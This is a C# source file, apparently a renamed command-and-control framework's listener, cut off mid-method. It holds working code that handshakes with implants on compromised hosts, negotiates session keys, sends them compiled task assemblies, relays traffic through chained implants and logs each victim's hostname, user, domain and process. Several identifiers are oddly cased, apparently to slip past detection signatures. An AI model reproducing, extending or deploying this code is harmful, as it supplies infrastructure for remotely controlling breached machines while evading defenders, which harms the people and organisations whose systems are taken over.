using System;
using System.IO;
using System.Xml;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Reflection;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

using Microsoft.Rest;
using Microsoft.CodeAnalysis;
using Microsoft.AspNetCore.SignalR.Client;
using Newtonsoft.Json;

using LemonSqueezy.Core;
using LemonSqueezy.API;
using APIModels = LemonSqueezy.API.Models;

namespace LemonSqueezy.Models.Listeners
{
    public class InternalListener
    {
        public class NewMessageArgs : EventArgs
        {
            public string Guid { get; set; }
            public NewMessageArgs(string Guid)
            {
                this.Guid = Guid;
            }
        }

        public event EventHandler<NewMessageArgs> OnNewMessage = delegate { };

        private HubConnection _connection;
        private ILemonSqueezyAPI _client;
        private ProfileTransformAssembly _transform;
        private readonly ModelUtilities _utilities = new ModelUtilities();

        internal enum MofoMessageCacheStatus
        {
            Ok,
            NotFound
        }
        internal class MofoMessageCacheInfo
        {
            public APIModels.MofoTasking Tasking { get; set; }
            public string Message { get; set; }
            public MofoMessageCacheStatus Status { get; set; }
        }

        internal class ProfileTransformAssembly
        {
            public int Id { get; set; }
            public byte[] ProfileTransformBytes { get; set; }
        }

        private readonly object _hashCodesLock = new object();
        private readonly HashSet<int> CacheTaskHashCodes = new HashSet<int>();
        private ConcurrentDictionary<string, ConcurrentQueue<MofoMessageCacheInfo>> MofoMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<MofoMessageCacheInfo>>();

        public InternalListener()
        {

        }

        public InternalListener(APIModels.Profile profile, string ListenerGuid, string LemonSqueezyUrl, string LemonSqueezyToken)
        {
            _ = Configure(profile, ListenerGuid, LemonSqueezyUrl, LemonSqueezyToken);
        }

        public class AlwaysRetryPolicy : IRetryPolicy
        {
            public TimeSpan? NextRetryDelay(RetryContext context)
            {
                if (context.PreviousRetryCount == 0)
                {
                    return TimeSpan.Zero;
                }
                if (context.PreviousRetryCount < 5)
                {
                    return TimeSpan.FromSeconds(5);
                }
                return TimeSpan.FromSeconds(10);
            }
        }

        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string LemonSqueezyUrl, string LemonSqueezyToken)
        {
            _transform = new ProfileTransformAssembly
            {
                ProfileTransformBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                {
                    Language = Mofos.ImplantLanguage.CSharp,
                    Source = profile.MessageTransform,
                    TargetDotNetVersion = Common.DotNetVersion.NetCore31,
                    References = Common.DefaultReferencesNetCore,
                    UseSubprocess = false
                })
            };

            X509Certificate2 covenantCert = new X509Certificate2(Common.LemonSqueezyPublicCertFile);
            HttpClientHandler clientHandler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
                {
                    return cert.GetCertHashString() == covenantCert.GetCertHashString();
                }
            };
            _client = new LemonSqueezyAPI(
                new Uri(LemonSqueezyUrl),
                new TokenCredentials(LemonSqueezyToken),
                clientHandler
            );

            _connection = new HubConnectionBuilder()
                .WithUrl(LemonSqueezyUrl + "/mofoHub", options =>
                {
                    options.AccessTokenProvider = () => { return Task.FromResult(LemonSqueezyToken); };
                    options.HttpMessageHandlerFactory = inner =>
                    {
                        var HttpClientHandler = (HttpClientHandler)inner;
                        HttpClientHandler.ServerCertificateCustomValidationCallback = clientHandler.ServerCertificateCustomValidationCallback;
                        return HttpClientHandler;
                    };
                })
                .WithAutomaticReconnect(new AlwaysRetryPolicy())
                .Build();
            _connection.HandshakeTimeout = TimeSpan.FromSeconds(20);
            try
            {
                await Task.Delay(5000);
                await _connection.StartAsync();
                await _connection.InvokeAsync("JoinGroup", ListenerGuid);
                _connection.On<string>("NotifyListener", (someid) =>
                {
                    InternalRead(someid).Wait();
                });
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("InternalListener SignalRConnection Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        public static APIModels.Profile ToProfile(Profile profile)
        {
            return new APIModels.Profile
            {
                Id = profile.Id,
                Name = profile.Name,
                Type = (APIModels.ProfileType)Enum.Parse(typeof(APIModels.ProfileType), profile.Type.ToString(), true),
                Description = profile.Description,
                MessageTransform = profile.MessageTransform
            };
        }

        private ModelUtilities.MofoEncMsg CreateMessageForMofo(APIModels.Mofo mofo, APIModels.Mofo targetMofo, ModelUtilities.MofoTaskingMessage taskingMessage)
        {
            return this.CreateMessageForMofo(mofo, targetMofo, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
        }

        private ModelUtilities.MofoEncMsg CreateMessageForMofo(APIModels.Mofo mofo, APIModels.Mofo targetMofo, byte[] message)
        {
            List<string> path = _client.GetPathToChildMofo(mofo.Id ?? default, targetMofo.Id ?? default).ToList();
            path.Reverse();
            ModelUtilities.MofoEncMsg finalMessage = null;
            ModelUtilities.MofoEncMsgType messageType = ModelUtilities.MofoEncMsgType.Tasking;
            foreach (string someid in path)
            {
                APIModels.Mofo thisMofo = _client.GetMofoBySOMEID(someid);
                finalMessage = ModelUtilities.MofoEncMsg.Create(
                    thisMofo,
                    message,
                    messageType
                );
                message = Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
                messageType = ModelUtilities.MofoEncMsgType.Routing;
            }
            return finalMessage;
        }

        private byte[] GetCompressedILAssembly35(string taskname)
        {
            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNet35Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly40(string taskname)
        {
            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNet40Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly30(string taskname)
        {
            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
        }

        private ModelUtilities.MofoTaskingMessage GetMofoTaskingMessage(APIModels.MofoTasking tasking, APIModels.DotNetVersion version)
        {
            string Message = "";
            if (tasking.Type == APIModels.MofoTaskingType.Assembly)
            {
                if (version == APIModels.DotNetVersion.Net35)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.MofoTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                    }
                }
                else if (version == APIModels.DotNetVersion.Net40)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.MofoTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                    }
                }
                else if (version == APIModels.DotNetVersion.NetCore31)
                {
                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.MofoTask.Name));
                    if (tasking.Parameters.Any())
                    {
                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                    }
                }
            }
            else
            {
                Message = string.Join(",", tasking.Parameters);
            }
            return new ModelUtilities.MofoTaskingMessage
            {
                Type = tasking.Type,
                Name = tasking.Name,
                Message = Message,
                Token = tasking.MofoTask == null ? false : tasking.MofoTask.TokenTask
            };
        }

        private int GetTaskingHashCode(APIModels.MofoTasking tasking)
        {
            if (tasking != null)
            {
                int code = tasking.Id ?? default;
                code ^= tasking.MofoId;
                code ^= tasking.MofoTaskId;
                code ^= tasking.MofoCommandId ?? default;
                foreach (char c in tasking.Name) { code ^= c; }
                return code;
            }
            return Guid.NewGuid().GetHashCode();
        }

        private int GetCacheEntryHashCode(MofoMessageCacheInfo cacheEntry)
        {
            return GetTaskingHashCode(cacheEntry.Tasking);
        }

        private void PushCache(string someid, MofoMessageCacheInfo cacheEntry)
        {
            if (this.MofoMessageCache.TryGetValue(someid, out ConcurrentQueue<MofoMessageCacheInfo> cacheQueue))
            {
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                        this.OnNewMessage(this, new NewMessageArgs(someid));
                    }
                }
            }
            else
            {
                cacheQueue = new ConcurrentQueue<MofoMessageCacheInfo>();
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                    }
                }
                this.MofoMessageCache[someid] = cacheQueue;
                this.OnNewMessage(this, new NewMessageArgs(someid));
            }
        }

        private async Task<APIModels.Mofo> GetMofoForGuid(string someid)
        {
            try
            {
                if (!string.IsNullOrEmpty(someid))
                {
                    return await _client.GetMofoBySOMEIDAsync(someid);
                }
            }
            catch (Exception) { }
            return null;
        }

        private async Task<APIModels.Mofo> CheckInMofo(APIModels.Mofo mofo)
        {
            if (mofo == null)
            {
                return null;
            }
            mofo.LastCheckIn = DateTime.UtcNow;
            return await _client.EditMofoAsync(mofo);
        }

        private async Task<APIModels.MofoTasking> MarkTasked(APIModels.MofoTasking tasking)
        {
            if (tasking == null)
            {
                return null;
            }
            tasking.Status = APIModels.MofoTaskingStatus.Tasked;
            tasking.TaskingTime = DateTime.UtcNow;
            return await _client.EditMofoTaskingAsync(tasking);
        }

        public async Task<string> Read(string someid)
        {
            if (string.IsNullOrEmpty(someid))
            {
                return "";
            }
            await CheckInMofo(await GetMofoForGuid(someid));
            if (this.MofoMessageCache.TryGetValue(someid, out ConcurrentQueue<MofoMessageCacheInfo> cache))
            {
                if (cache.TryDequeue(out MofoMessageCacheInfo cacheEntry))
                {
                    switch (cacheEntry.Status)
                    {
                        case MofoMessageCacheStatus.NotFound:
                            await this.MarkTasked(cacheEntry.Tasking);
                            throw new ControllerNotFoundException(cacheEntry.Message);
                        case MofoMessageCacheStatus.Ok:
                            await this.MarkTasked(cacheEntry.Tasking);
                            return cacheEntry.Message;
                    }
                }
                return "";
            }
            await InternalRead(someid);
            return "";
        }

        private async Task InternalRead(string someid)
        {
            try
            {
                APIModels.Mofo temp = await GetMofoForGuid(someid);
                APIModels.Mofo mofo = await CheckInMofo(temp);
                if (mofo == null)
                {
                    // Invalid SOMEID. May not be legitimate Mofo request, respond Ok
                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = "" });
                }
                else
                {
                    IList<APIModels.MofoTasking> mofoTaskings = await _client.GetSearchUninitializedMofoTaskingsAsync(mofo.Id ?? default);
                    if (mofoTaskings == null || mofoTaskings.Count == 0)
                    {
                        // No MofoTasking assigned. Respond with empty template
                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = "" });
                    }
                    else
                    {
                        foreach (APIModels.MofoTasking tasking in mofoTaskings)
                        {
                            APIModels.MofoTasking mofoTasking = tasking;
                            if (mofoTasking.Type == APIModels.MofoTaskingType.Assembly && mofoTasking.MofoTask == null)
                            {
                                // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = mofoTasking });
                            }
                            else
                            {
                                mofoTasking.Mofo = mofoTasking.MofoId == mofo.Id ? mofo : await _client.GetMofoAsync(mofoTasking.MofoId);
                                ModelUtilities.MofoEncMsg message = null;
                                try
                                {
                                    message = this.CreateMessageForMofo(mofo, mofoTasking.Mofo, this.GetMofoTaskingMessage(mofoTasking, mofoTasking.Mofo.DotNetVersion));
                                    // Transform response
                                    string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
                                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = mofoTasking });
                                }
                                catch (HttpOperationException)
                                {
                                    mofoTasking.Status = APIModels.MofoTaskingStatus.Aborted;
                                    await _client.EditMofoTaskingAsync(mofoTasking);
                                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "" });
            }
        }

        public async Task<string> Write(string someid, string data)
        {
            try
            {
                ModelUtilities.MofoEncMsg message = null;
                try
                {
                    string inverted = Common.LemonSqueezyEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
                    message = JsonConvert.DeserializeObject<ModelUtilities.MofoEncMsg>(inverted);
                }
                catch (Exception)
                {
                    // Request not formatted correctly. May not be legitimate Mofo request, respond NotFound
                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return someid;
                }
                APIModels.Mofo egressMofo;
                try
                {
                    egressMofo = someid == null ? null : await _client.GetMofoBySOMEIDAsync(someid);
                }
                catch (HttpOperationException)
                {
                    egressMofo = null;
                }
                APIModels.Mofo targetMofo = null;
                try
                {
                    targetMofo = await _client.GetMofoBySOMEIDAsync(message.SOMEID);
                }
                catch (HttpOperationException)
                {
                    targetMofo = null;
                    // Stage0 Guid is OriginalServerGuid + Guid
                    if (message.SOMEID.Length == 20)
                    {
                        string originalServerGuid = message.SOMEID.Substring(0, 10);
                        someid = message.SOMEID.Substring(10, 10);
                        targetMofo = await _client.GetMofoByOriginalServerSOMEIDAsync(originalServerGuid);
                        if (targetMofo != null)
                        {
                            var it = await _client.GetImplantTemplateAsync(targetMofo.ImplantTemplateId);
                            if (egressMofo == null && it.CommType == APIModels.CommunicationType.SMB)
                            {
                                // Get connecting Mofo as egress
                                List<APIModels.MofoTasking> taskings = (await _client.GetAllMofoTaskingsAsync()).ToList();
                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ someid of some sort?
                                APIModels.MofoTasking connectTasking = taskings
                                    .Where(GT => GT.Type == APIModels.MofoTaskingType.Connect &&
                                            (GT.Status == APIModels.MofoTaskingStatus.Progressed || GT.Status == APIModels.MofoTaskingStatus.Tasked))
                                    .Reverse()
                                    .FirstOrDefault();
                                if (connectTasking == null)
                                {
                                    egressMofo = null;
                                }
                                else
                                {
                                    APIModels.Mofo taskedMofo = await _client.GetMofoAsync(connectTasking.MofoId);
                                    egressMofo ??= await _client.GetOutboundMofoAsync(taskedMofo.Id ?? default);
                                }
                            }
                        }
                        await this.PostStage0(egressMofo, targetMofo, message, message.SOMEID.Substring(10), someid);
                        return someid;
                    }
                    else
                    {
                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return someid;
                    }
                }

                switch (targetMofo.Status)
                {
                    case APIModels.MofoStatus.Uninitialized:
                        await this.PostStage0(egressMofo, targetMofo, message, someid, someid);
                        return someid;
                    case APIModels.MofoStatus.Stage0:
                        await this.PostStage1(egressMofo, targetMofo, message, someid);
                        return someid;
                    case APIModels.MofoStatus.Stage1:
                        await this.PostStage2(egressMofo, targetMofo, message, someid);
                        return someid;
                    case APIModels.MofoStatus.Stage2:
                        await this.RegisterMofo(egressMofo, targetMofo, message, someid);
                        return someid;
                    case APIModels.MofoStatus.Active:
                        await this.PostTask(egressMofo, targetMofo, message, egressMofo.Guid);
                        return someid;
                    case APIModels.MofoStatus.Lost:
                        await this.PostTask(egressMofo, targetMofo, message, egressMofo.Guid);
                        return someid;
                    default:
                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return someid;
                }
            }
            catch
            {
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return someid;
            }
        }

        private async Task PostTask(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg outputMessage, string someid)
        {
            if (targetMofo == null || egressMofo == null || egressMofo.Guid != someid)
            {
                // Invalid SOMEID. May not be legitimate Mofo request, respond NotFound
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            string TaskName = outputMessage.Meta;
            if (string.IsNullOrWhiteSpace(TaskName))
            {
                // Invalid task response. This happens on post-register write
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            APIModels.MofoTasking mofoTasking;
            try
            {
                mofoTasking = await _client.GetMofoTaskingByNameAsync(TaskName);
            }
            catch (HttpOperationException)
            {
                // Invalid taskname. May not be legitimate Mofo request, respond NotFound
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            if (targetMofo == null)
            {
                // Invalid Mofo. May not be legitimate Mofo request, respond NotFound
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
            {
                // Invalid signature. Almost certainly not a legitimate Mofo request, respond NotFound
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            string taskRawResponse = Common.LemonSqueezyEncoding.GetString(_utilities.MofoSessionDecrypt(targetMofo, outputMessage));
            ModelUtilities.MofoTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.MofoTaskingMessageResponse>(taskRawResponse);
            APIModels.MofoCommand command = await _client.GetMofoCommandAsync(mofoTasking.MofoCommandId ?? default);
            await _client.AppendCommandOutputAsync(command.CommandOutputId, taskResponse.Output);

            mofoTasking.Status = taskResponse.Status;
            if (mofoTasking.Status == APIModels.MofoTaskingStatus.Completed)
            {
                mofoTasking.CompletionTime = DateTime.UtcNow;
            }
            if (mofoTasking.Type == APIModels.MofoTaskingType.Connect)
            {
                mofoTasking.Status = APIModels.MofoTaskingStatus.Progressed;
            }
            await _client.EditMofoTaskingAsync(mofoTasking);
            lock (_hashCodesLock)
            {
                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(mofoTasking));
            }
            if (mofoTasking.Type == APIModels.MofoTaskingType.SetDelay || mofoTasking.Type == APIModels.MofoTaskingType.SetJItter ||
                mofoTasking.Type == APIModels.MofoTaskingType.SetConneCTAttEmpts || mofoTasking.Type == APIModels.MofoTaskingType.SetKillDate ||
                mofoTasking.Type == APIModels.MofoTaskingType.Exit)
            {
                targetMofo = await _client.GetMofoAsync(targetMofo.Id ?? default);
            }
            await CheckInMofo(targetMofo);
            return;
        }

        private async Task PostStage0(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoFirstResponse, string targetGuid, string someid)
        {
            if (targetMofo == null || !mofoFirstResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoSharedSecretPassword)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            bool egressMofoExists = egressMofo != null;

            if (targetMofo.Status != APIModels.MofoStatus.Uninitialized)
            {
                // We create a new Mofo if this one is not uninitialized
                APIModels.Mofo tempModel = new APIModels.Mofo
                {
                    Id = 0,
                    Name = Utilities.CreateShortGuid(),
                    Guid = targetGuid,
                    OriginalServerGuid = Utilities.CreateShortGuid(),
                    Status = APIModels.MofoStatus.Stage0,
                    ListenerId = targetMofo.ListenerId,
                    Listener = targetMofo.Listener,
                    ImplantTemplateId = targetMofo.ImplantTemplateId,
                    MofoSharedSecretPassword = targetMofo.MofoSharedSecretPassword,
                    SmbPipeName = targetMofo.SmbPipeName,
                    Delay = targetMofo.Delay,
                    JItterPercent = targetMofo.JItterPercent,
                    KillDate = targetMofo.KillDate,
                    ConneCTAttEmpts = targetMofo.ConneCTAttEmpts,
                    DotNetVersion = targetMofo.DotNetVersion,
                    RuntimeIdentifier = targetMofo.RuntimeIdentifier,
                    LastCheckIn = DateTime.UtcNow
                };
                targetMofo = await _client.CreateMofoAsync(tempModel);
            }
            else
            {
                targetMofo.Status = APIModels.MofoStatus.Stage0;
                targetMofo.Guid = targetGuid;
                targetMofo.LastCheckIn = DateTime.UtcNow;
                targetMofo = await _client.EditMofoAsync(targetMofo);
            }
            if (!egressMofoExists)
            {
                egressMofo = targetMofo;
            }

            // EncMsg is the RSA Public Key
            targetMofo.MofoRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
                mofoFirstResponse,
                Convert.FromBase64String(targetMofo.MofoSharedSecretPassword)
            ));
            // Generate negotiated session key
            using (Aes newAesKey = Aes.Create())
            {
                newAesKey.GenerateKey();
                targetMofo.MofoNegotiatedSessKEy = Convert.ToBase64String(newAesKey.Key);
                await _client.EditMofoAsync(targetMofo);
            }

            if (egressMofoExists)
            {
                // Add this as Child mofo to Mofo that connects it
                List<APIModels.MofoTasking> taskings = _client.GetAllMofoTaskings().ToList();
                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ someid of some sort?
                APIModels.MofoTasking connectTasking = taskings
                    .Where(GT => GT.Type == APIModels.MofoTaskingType.Connect && (GT.Status == APIModels.MofoTaskingStatus.Progressed || GT.Status == APIModels.MofoTaskingStatus.Tasked))
                    .Reverse()
                    .FirstOrDefault();
                if (connectTasking == null)
                {
                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return;
                }
                ModelUtilities.MofoTaskingMessage tmessage = this.GetMofoTaskingMessage(connectTasking, targetMofo.DotNetVersion);
                targetMofo.Hostname = tmessage.Message.Split(",")[0];
                await _client.EditMofoAsync(targetMofo);
                connectTasking.Status = APIModels.MofoTaskingStatus.Completed;
                connectTasking.Parameters.Add(targetMofo.Guid);
                await _client.EditMofoTaskingAsync(connectTasking);
                targetMofo = await _client.GetMofoAsync(targetMofo.Id ?? default);
            }

            byte[] rsaEncryptedBytes = EncryptUtilities.MofoRSAEncrypt(targetMofo, Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy));
            ModelUtilities.MofoEncMsg message = null;
            try
            {
                message = this.CreateMessageForMofo(egressMofo, targetMofo, rsaEncryptedBytes);
            }
            catch (HttpOperationException)
            {
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            // Transform response
            // FirstResponse: "Id,Name,Base64(IV),Base64(AES(RSA(SessKEy))),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task PostStage1(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoSeccondResponse, string someid)
        {
            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage0 || !mofoSeccondResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressMofo == null)
            {
                egressMofo = targetMofo;
            }
            byte[] challenge1 = _utilities.MofoSessionDecrypt(targetMofo, mofoSeccondResponse);
            byte[] challenge2 = new byte[4];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(challenge2);
            }
            // Save challenge to compare on response
            targetMofo.MofoChallenge = Convert.ToBase64String(challenge2);
            targetMofo.Status = APIModels.MofoStatus.Stage1;
            targetMofo.LastCheckIn = DateTime.UtcNow;
            await _client.EditMofoAsync(targetMofo);

            ModelUtilities.MofoEncMsg message;
            try
            {
                message = this.CreateMessageForMofo(egressMofo, targetMofo, challenge1.Concat(challenge2).ToArray());
            }
            catch (HttpOperationException)
            {
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            // Transform response
            // SeccondResponse: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task PostStage2(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoThirdResponse, string someid)
        {
            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage1 || !mofoThirdResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressMofo == null)
            {
                egressMofo = targetMofo;
            }
            byte[] challenge2test = _utilities.MofoSessionDecrypt(targetMofo, mofoThirdResponse);
            if (targetMofo.MofoChallenge != Convert.ToBase64String(challenge2test))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            targetMofo.Status = APIModels.MofoStatus.Stage2;
            targetMofo.LastCheckIn = DateTime.UtcNow;
            await _client.EditMofoAsync(targetMofo);
            byte[] MofoExecutorAssembly = await this._client.CompileMofoExecutorAsync(targetMofo.Id ?? default);

            ModelUtilities.MofoEncMsg message;
            try
            {
                message = this.CreateMessageForMofo(egressMofo, targetMofo, MofoExecutorAssembly);
            }
            catch (HttpOperationException)
            {
                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject("")));
                throw new ControllerNotFoundException(emptyTransformed);
            }

            // Transform response
            // returns: "Base64(IV),Base64(AES(MofoExecutorAssembly)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        private async Task RegisterMofo(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoMessage, string someid)
        {
            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage2 || !mofoMessage.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
            {
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            if (egressMofo == null)
            {
                egressMofo = targetMofo;
            }
            string message = Common.LemonSqueezyEncoding.GetString(_utilities.MofoSessionDecrypt(targetMofo, mofoMessage));
            // todo: try/catch on deserialize?
            APIModels.Mofo mofo = JsonConvert.DeserializeObject<APIModels.Mofo>(message);
            targetMofo.IpAddress = mofo.IpAddress;
            targetMofo.Hostname = mofo.Hostname;
            targetMofo.OperatingSystem = mofo.OperatingSystem;
            targetMofo.UserDomainName = mofo.UserDomainName;
            targetMofo.UserName = mofo.UserName;
            targetMofo.Status = APIModels.MofoStatus.Active;
            targetMofo.Integrity = mofo.Integrity;
            targetMofo.Process = mofo.Process;
            targetMofo.LastCheckIn = DateTime.UtcNow;

            await _client.EditMofoAsync(targetMofo);

            ModelUtilities.MofoTaskingMessage tasking = new ModelUtilities.MofoTaskingMessage
            {
                Message = targetMofo.Guid,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Type = APIModels.MofoTaskingType.Tasks,
                Token = false
            };

            ModelUtilities.MofoEncMsg responseMessage;
            try
            {
                responseMessage = this.CreateMessageForMofo(egressMofo, targetMofo, tasking);
            }
            catch (HttpOperationException)
            {
                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            // Transform response
            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        internal static class EncryptUtilities
        {
            // Returns IV (16 bytes) + EncryptedData byte array
            public static byte[] AesEncrypt(byte[] data, byte[] key)
            {
                using (Aes SessKEy = Aes.Create())
                {
                    SessKEy.Mode = Common.AesCipherMode;
                    SessKEy.Padding = Common.AesPaddingMode;
                    SessKEy.GenerateIV();
                    SessKEy.Key = key;

                    byte[] encrypted = SessKEy.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);

                    return SessKEy.IV.Concat(encrypted).ToArray();
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public static byte[] AesDecrypt(byte[] data, byte[] key)
            {
                using (Aes SessKEy = Aes.Create())
                {
                    SessKEy.IV = data.Take(Common.AesIVLength).ToArray();
                    SessKEy.Key = key;

                    byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
                    return SessKEy.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }

            // Convenience method for decrypting an EncMsgPacket
            public static byte[] AesDecrypt(ModelUtilities.MofoEncMsg encryptedMessage, byte[] key)
            {
                return AesDecrypt(
